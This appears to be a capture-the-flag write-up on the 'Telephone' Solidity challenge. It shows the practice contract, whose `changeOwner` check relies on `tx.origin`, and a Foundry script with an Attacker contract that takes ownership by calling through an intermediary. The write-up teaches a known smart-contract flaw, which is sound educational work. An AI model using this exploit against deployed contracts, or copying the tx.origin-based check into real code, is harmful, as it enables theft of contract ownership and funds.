# Telephone   
In this challenge, our mission is to become the owner of the contract. This challenge demonstrates the importance of understanding the difference between `tx.origin` and `msg.sender` in Ethereum.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```
The contract has only one function: `changeOwner`, which checks if `tx.origin` is different from `msg.sender`. If they are different, it sets the address we pass to the function as the new owner of the contract.

To solve this challenge, we need to create a contract that calls the `changeOwner` function. This way, `msg.sender` will be the address of our contract, and `tx.origin` will be our wallet address, satisfying the condition `tx.origin != msg.sender`.

Here is the script I wrote to exploit this vulnerability:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Script} from "forge-std/Script.sol";

contract AttackScript is Script {
    Attacker attacker;

    function run() public {
        vm.startBroadcast();
        attacker = new Attacker( /* Your instance address */ );
        attacker.attack(/* here goes your address */);
        vm.stopBroadcast();
    }
}

contract Attacker {
    address victim;

    constructor(address _victim) {
        victim = _victim;
    }

    function attack(address mypubAddress) public {
        (bool success, ) = victim.call(
            abi.encodeWithSignature("changeOwner(address)", mypubAddress)
        );
    }
}
```
